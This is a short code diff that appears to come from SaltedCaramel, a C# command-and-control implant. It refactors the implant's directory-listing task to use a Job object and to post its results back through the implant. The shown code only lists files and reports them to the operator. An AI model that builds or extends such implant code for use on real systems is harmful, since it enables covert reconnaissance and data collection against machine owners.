@@ -5,14 +5,15 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using SaltedCaramel.Jobs;
 
 namespace SaltedCaramel.Tasks
 {
     public class DirectoryList
     {
-        public static void Execute(SCTask task, SCImplant implant)
+        public static void Execute(Job job, SCImplant implant)
         {
-            
+            SCTask task = job.Task;
             string path = task.@params;
             SharpSploitResultList<Host.FileSystemEntryResult> list;
 
@@ -46,8 +47,8 @@ namespace SaltedCaramel.Tasks
                 }
 
                 SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fileList));
-                implant.Profile.PostResponse(response);
-                implant.Profile.SendComplete(task.id);
+                implant.TryPostResponse(response);
+                implant.TrySendComplete(job);
                 task.status = "complete";
                 task.message = fileList.ToString();
             }
